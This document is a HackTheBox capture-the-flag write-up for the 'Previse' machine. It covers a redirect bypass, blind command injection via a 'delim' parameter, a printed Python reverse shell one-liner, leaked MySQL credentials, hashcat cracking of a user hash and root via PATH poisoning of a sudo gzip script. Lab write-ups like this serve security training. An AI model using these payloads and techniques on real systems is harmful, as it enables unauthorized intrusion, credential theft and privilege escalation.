# Previse HackTheBox By Hussien Misbah 

![image](https://user-images.githubusercontent.com/67979878/148392133-bedae80a-7ec0-46a0-ba22-1b6d5359b375.png)


instead of copy and paste the ip repeatedly we can export the ip value and assign variable name ``$IP`` in the current bash shell 

```bash
export IP=10.10.11.104
```
# scanning :

will start with a basic scan and can scan all ports in background in case this wan't helpful for us .

```bash
sudo nmap -sV -vv $IP -oN nmap/intial 
```

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
```

visiting the web page :

![Pasted image 20211002032239](https://user-images.githubusercontent.com/67979878/148391150-b7965f0b-8cc4-47ac-aa7c-b1e093a5c88e.png)

tried some sqli but not worked 

## directory brute-force :

```bash
$ gobuster dir -u http://10.10.11.104/ -w /usr/share/dirb/wordlists/big.txt -x php,txt
```

found :

```bash
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]
/config.php           (Status: 200) [Size: 0]                   
/download.php         (Status: 302) [Size: 0] [--> login.php]                 
/files.php            (Status: 302) [Size: 4914] [--> login.php]              
```

you can use curl without enabling redirect  and will notice the same thing immediately 

```bash
curl http://10.10.11.104/accounts.php -vvv     
```

But i opened up my burpsuite and observe the requests and response for /accounts.php

- there is a redirect happen to /login.php again . 
- i do intercept the redirect and found : 

![Pasted image 20211002033401](https://user-images.githubusercontent.com/67979878/148391173-ecb237b8-8962-48e7-858d-1b60e3be4f0e.png)

hence i want to view and interact with this page , i changed the  HTTP 302 redirect to HTTP 200 OK 

![Pasted image 20211002033552](https://user-images.githubusercontent.com/67979878/148391191-148fdc33-f415-4ebf-8110-aa9827290254.png)

forward it :

![Pasted image 20211002033625](https://user-images.githubusercontent.com/67979878/148391197-0399671b-650f-413f-afd8-a7fc76ad76e0.png)

i made an account and then redirected me to /login.php again so i logged in successfully 

![Pasted image 20211002034057](https://user-images.githubusercontent.com/67979878/148391208-b0eb880c-cb58-4621-a8de-dd4bada49fe2.png)

navigating through the tabs found :

![Pasted image 20211002034221](https://user-images.githubusercontent.com/67979878/148391215-2690564d-b6ab-4933-aa62-3776ec473234.png)

so i downloaded the backup and found :

![Pasted image 20211002034249](https://user-images.githubusercontent.com/67979878/148391225-1c3686f8-f733-4005-8808-300d73a593b0.png)

in config.php :

```php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

after some navigating in the files :

in /logs.php

![Pasted image 20211002034826](https://user-images.githubusercontent.com/67979878/148391593-466c6856-1fae-4f5a-b817-ff3cf2372929.png)

- so we can see the exec function  which most likely indicating RCE , and python is executing on a script and seems the script saves output in out.log .

- understanding the logic at my local machine :

![Pasted image 20211002041124](https://user-images.githubusercontent.com/67979878/148391624-abe26f8a-da55-4263-9b7f-9df8de4c8490.png)

- so we can inject any command like : 
``delim=comma;INJECTION`` However it won't be printed in logs.out so it is a Blind RCE . 

- we can get a shell immediatley 

[+] from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip>",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

![image](https://user-images.githubusercontent.com/67979878/148393295-4efc60e2-69c5-4ca2-8ab1-6ff609f34b53.png)
![image](https://user-images.githubusercontent.com/67979878/148393553-8065a828-09eb-4934-8923-38c27045adf0.png)
```python
# stablizie the shell 
$ python -c "import pty;pty.spawn('/bin/bash')"
```

hence we are in the machine now so we can access local host and view data base :D 

```bash
mysql -h localhost -u root -p previse
```

```sql

mysql> SELECT table_name FROM information_schema.tables;
```

![Pasted image 20211002042525](https://user-images.githubusercontent.com/67979878/148391748-243a146f-d711-42cf-8aed-e5a3cf7d7298.png)

- so we need m4lware password only `i guess :3` let's get it and try crack the hash from here: 

https://gist.github.com/dwallraff/6a50b5d2649afeb1803757560c176401

- we can see it is a md5crypt hash 
```bash
$ hashcat -m 500 -a 0 hashed_m4lware /usr/share/wordlists/rockyou.txt
# 500 : md5crypt
# 0   : straight attack mode
# output :
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```

![Pasted image 20211002043827](https://user-images.githubusercontent.com/67979878/148391766-e2ad47a1-124e-4296-8fd3-dd644bf26fc8.png)

## privilege escalation 

![Pasted image 20211002043918](https://user-images.githubusercontent.com/67979878/148391778-a695bd71-8508-4f94-8071-8a9b505f7e43.png)

so let's read the script : 
```bash
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz

```

- so it simply makes a backup for the logs with gzip . 
- we can notice ``gzip`` is not written as full path ``/usr/bin/gzip`` and this will allow us to try Path poisoning 

### PATH poisoning
- we can see here :
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/

we can use that so when we execute this as root "with sudo" gzip will refer to the /tmp in the path 

![Pasted image 20211002044848](https://user-images.githubusercontent.com/67979878/148393698-506ceea5-329b-4a9a-94e3-d39297de522a.png)

i don't know why but the shell doesn't return any result although i gained the root access so i make a reverse shell and it worked perfectly 

![image](https://user-images.githubusercontent.com/67979878/148394272-fec336de-f762-4b73-82b7-fa155bfbe551.png)

# Pwned
